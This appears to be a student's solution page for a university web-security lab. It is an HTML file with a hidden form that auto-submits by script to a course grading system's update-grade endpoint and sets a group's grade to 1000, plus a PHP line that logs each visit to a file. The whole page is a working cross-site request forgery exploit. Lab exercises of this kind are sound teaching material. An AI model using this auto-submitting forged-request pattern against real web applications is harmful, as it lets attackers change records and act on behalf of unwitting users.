<html>
<body>

<form action="https://codered.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade" method="post">
<input type="text" name="groups" value="raincloud"><br>
<input type="password" name="grade" value="1000"><br>
<input type="submit">
</form>
<script>document.forms[0].submit()</script>
<?php
$c = file_put_contents("/cse/web/homes/lib49/visited.txt", "visited", FILE_APPEND);
?>

</body>
</html>
